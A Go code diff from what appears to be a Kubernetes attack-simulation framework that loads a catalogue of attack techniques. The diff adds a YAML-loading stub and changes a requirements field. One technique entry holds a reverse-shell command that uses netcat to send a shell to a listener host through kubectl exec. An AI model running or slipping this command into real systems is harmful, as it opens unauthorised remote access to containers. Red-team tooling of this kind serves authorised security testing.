@@ -49,9 +49,6 @@ import (
 // 	return
 // }
 
-type EstablishReverseShell struct {
-}
-
 // type ReadEnvVars struct {
 // 	TTPMeta
 // 	TargetId        string
@@ -85,6 +82,15 @@ func LoadArmory(dir string) (Armory, error) {
 			// skip subfolder with all unsupported check details
 			// if d.Name() == SkipDir { }
 			return err
+		}
+
+		if strings.HasSuffix(w, ".yaml") {
+			a := 5
+			_ = a
+			// parse the TTP
+			// parse the preconditions and effect
+			// invoke builder to get the currect sub-type of the TTP (based on the kind?)
+
 		}
 
 		if strings.HasSuffix(w, ".md") {
@@ -147,7 +153,7 @@ func LoadArmory(dir string) (Armory, error) {
 			Description: "Use kubectl exec to establish a simple shell",
 			Cmd:         "nc $LISTENER $LISTENER_PORT -e /bin/sh &",
 			Tactics:     []string{"Execution"},
-			// Requires:    domain.Requirements{Kind: "Listener"},
+			Requires:    domain.Requirements{Infra: []string{"Listener"}},
 		},
 		// ExecSimpleReverseShell{
 		// 	TTPMeta: TTPMeta{
